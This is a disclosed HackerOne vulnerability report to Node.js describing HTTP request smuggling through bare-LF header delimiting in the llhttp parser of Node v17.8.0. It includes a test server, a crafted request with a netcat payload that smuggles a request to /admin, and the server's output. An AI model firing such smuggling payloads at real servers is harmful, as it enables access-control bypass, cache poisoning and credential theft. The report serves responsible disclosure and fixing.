# HTTP Request Smuggling Due To Improper Delimiting of Header Fields

## Report Details
- **Report ID**: 1524692
- **URL**: https://hackerone.com/reports/1524692
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-03-28T16:07:45.081Z
- **Disclosed**: 2022-07-07T17:26:47.529Z

## Reporter
- **Username**: zeyu2001
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**

The `llhttp` parser in the `http` module in Node v17.8.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).

**Description:**

The LF character (without CR) is sufficient to delimit HTTP header fields in the `lihttp` parser. According to [RFC7230 section 3](https://datatracker.ietf.org/doc/html/rfc7230#section-3), only the CRLF sequence should delimit each `header-field`.

Consider the following request (all lines are delimited by CRLF except the `[\n]` part)

```http
GET / HTTP/1.1
Host: localhost
Dummy: x[\n]Content-Length: 23

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost

```

Suppose that an upstream server:
- Correctly delimits lines by the CRLF sequence instead of only LF
- Incorrectly allows the LF character in header values

This leads to HTTP request smuggling as the Node server sees one extra header field, `Content-Length: 23` while the upstream proxy thinks that the content length of the first request is 0.

Request as seen by the Node server:

```http
GET / HTTP/1.1
Host: localhost
Dummy: x
Content-Length: 23

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost

```

## Steps To Reproduce:

Server code I used for testing:

```javascript
const http = require('http');

http.createServer((request, response) => {
   let body = [];
   request.on('error', (err) => {
      response.end("error while reading body: " + err)
   }).on('data', (chunk) => {
      body.push(chunk);
   }).on('end', () => {
   body = Buffer.concat(body).toString();
   
   response.on('error', (err) => {
      response.end("error while sending response: " + err)
   });

   response.end(JSON.stringify({
         "URL": request.url,
         "Headers": request.headers,
         "Length": body.length,
         "Body": body,
      }) + "\n");
   });
}).listen(80);
```

Payload:

```bash
(printf "GET / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
"Dummy: x\nContent-Length: 23\r\n"\
"\r\n"\
"GET / HTTP/1.1\r\n"\
"Dummy: GET /admin HTTP/1.1\r\n"\
"Host: localhost\r\n"\
"\r\n"\
"\r\n") | nc localhost 80
```

**Expected result:** Sees two requests, both to `/`.

**Actual result:** Sees one request to `/` and another to `/admin`.

```http
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:51:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 124

{"URL":"/","Headers":{"host":"localhost","dummy":"x","content-length":"23"},"Length":23,"Body":"GET / HTTP/1.1\r\nDummy: "}
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:51:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 69

{"URL":"/admin","Headers":{"host":"localhost"},"Length":0,"Body":""}
```

## Impact

Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.

## Attachments
No attachments
